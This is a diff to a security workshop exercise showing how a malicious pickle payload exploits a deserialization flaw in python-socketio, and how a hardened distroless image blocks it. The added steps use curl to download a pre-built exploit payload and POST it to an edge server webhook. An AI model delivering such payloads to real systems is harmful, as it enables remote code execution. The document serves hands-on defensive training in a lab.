@@ -62,6 +62,8 @@ envsubst < setup/exercise4/k8s/namespace.yaml | oc apply --filename -
 envsubst < setup/exercise4/k8s/redis.yaml | oc apply --filename -
 envsubst < setup/exercise4/k8s/edge-server.yaml | oc apply --filename -
 envsubst < setup/exercise4/k8s/socketio-server.yaml | oc apply --filename -
+envsubst < setup/exercise4/k8s/edge-server-route.yaml | oc apply --filename -
+envsubst < setup/exercise4/k8s/socketio-server-route.yaml | oc apply --filename -
 ```
 
 Wait for all pods to become ready:
@@ -79,26 +81,31 @@ You should see three running pods: `message-broker`, `socketio-server`, and `edg
 
 ## 4.3 Trigger the exploit
 
-Now, let's act as the attacker. We'll run a Job that sends a malicious pickle payload to the edge server, which forwards it to the Redis broker, where the vulnerable Socket.IO server picks it up and deserializes it, in doing so executing our code.
+Now, let's act as the attacker. We'll send a malicious pickle payload to the edge server's public route, which forwards it to the Redis broker, where the vulnerable Socket.IO server picks it up and deserializes it, in doing so executing our code.
+
+First, grab the route URLs and download the pre-built exploit payload:
 
 ```bash
-envsubst < setup/exercise4/k8s/exploit-job.yaml | oc apply --filename -
+export EDGE_URL=$(oc --namespace $NAMESPACE get route edge-server --output jsonpath='{.spec.host}')
+export SOCKETIO_URL=$(oc --namespace $NAMESPACE get route socketio-server --output jsonpath='{.spec.host}')
+curl -sSfL https://raw.githubusercontent.com/jmhbnz/workshops/main/data/workshop/setup/exercise4/exploit/payload.bin -o /tmp/payload.bin
 ```
 
-Watch the exploit Job's logs:
+Now deliver the exploit payload to the edge server webhook:
 
 ```bash
-oc --namespace $NAMESPACE logs --follow job/cve-2025-61765-exploit
+curl -X POST "https://${EDGE_URL}/webhook" \
+  -H "Content-Type: application/octet-stream" \
+  -H "X-Channel: socketio" \
+  --data-binary @/tmp/payload.bin
 ```
 
-You should see output confirming the payload was delivered to the edge server webhook and received by a subscriber.
+You should see a JSON response confirming the payload was delivered and received by a subscriber.
 
-Now check whether the exploit succeeded. The Socket.IO server exposes an `/evidence` endpoint that reads the evidence file. We can query it by running a verification Job that curls the endpoint:
+Now check whether the exploit succeeded. The Socket.IO server exposes an `/evidence` endpoint that reads the evidence file:
 
 ```bash
-envsubst < setup/exercise4/k8s/verify-job.yaml | oc apply --filename -
-oc --namespace $NAMESPACE wait --for=condition=complete job/verify-exploit --timeout=30s
-oc --namespace $NAMESPACE logs job/verify-exploit
+curl -sf "https://${SOCKETIO_URL}/evidence"
 ```
 
 If the exploit worked, you'll see output like:
@@ -107,7 +114,7 @@ If the exploit worked, you'll see output like:
 >>> COMPROMISED via CVE-2025-61765 <<<
 ```
 
-**The Socket.IO server has been compromised.** An attacker delivered arbitrary code through a pickle payload. The server had no way to distinguish it from a legitimate inter-server message.
+**The Socket.IO server has been compromised.** An attacker delivered arbitrary code through a pickle payload from outside the cluster. The server had no way to distinguish it from a legitimate inter-server message.
 
 > Take a minute to review the exploit source at [`exploit/poc.py`](https://github.com/jmhbnz/workshops/blob/main/data/workshop/setup/exercise4/exploit/poc.py) and the vulnerable server at [`socketio-server/server.py`](https://github.com/jmhbnz/workshops/blob/main/data/workshop/setup/exercise4/socketio-server/server.py). The server code itself looks completely normal. The vulnerability is in the `python-socketio` library's use of `pickle.loads()`.
 
@@ -176,33 +183,22 @@ You should see `quay.io/smileyfritz/socketio-server:0.1.0-hardened`.
 
 ## 4.6 Verify the fix
 
-First, delete the previous exploit and verification Jobs:
+Re-run the exploit against the hardened server. The edge server and Redis still relay the payload as before:
 
 ```bash
-oc --namespace $NAMESPACE delete job cve-2025-61765-exploit verify-exploit --ignore-not-found
+curl -X POST "https://${EDGE_URL}/webhook" \
+  -H "Content-Type: application/octet-stream" \
+  -H "X-Channel: socketio" \
+  --data-binary @/tmp/payload.bin
 ```
 
-Now re-run the exploit:
+Now check the `/evidence` endpoint:
 
 ```bash
-envsubst < setup/exercise4/k8s/exploit-job.yaml | oc apply --filename -
+curl -sf "https://${SOCKETIO_URL}/evidence"
 ```
 
-Watch the logs — the exploit will appear to send successfully (the edge server and Redis still relay the payload):
-
-```bash
-oc --namespace $NAMESPACE logs --follow job/cve-2025-61765-exploit
-```
-
-Now run the verification Job to query the `/evidence` endpoint:
-
-```bash
-envsubst < setup/exercise4/k8s/verify-job.yaml | oc apply --filename -
-oc --namespace $NAMESPACE wait --for=condition=complete --for=condition=failed job/verify-exploit --timeout=30s
-oc --namespace $NAMESPACE logs job/verify-exploit
-```
-
-The verification Job will **fail** ⛔. The evidence file was never created because the exploit payload called `subprocess.call(["/bin/bash", ...])` and there is no `/bin/bash` in the Red Hat Hardened Images distroless image. The pickle deserialization still triggered, but the code execution failed.
+This time the response will be empty — **no evidence file was created** ⛔. The exploit payload called `subprocess.call(["/bin/bash", ...])` and there is no `/bin/bash` in the Red Hat Hardened Images distroless image. The pickle deserialization still triggered, but the code execution failed.
 
 <Zoom>
 ![exploit-job-failed](/workshops/static/images/fsi-security/exploit-job-failed.png)
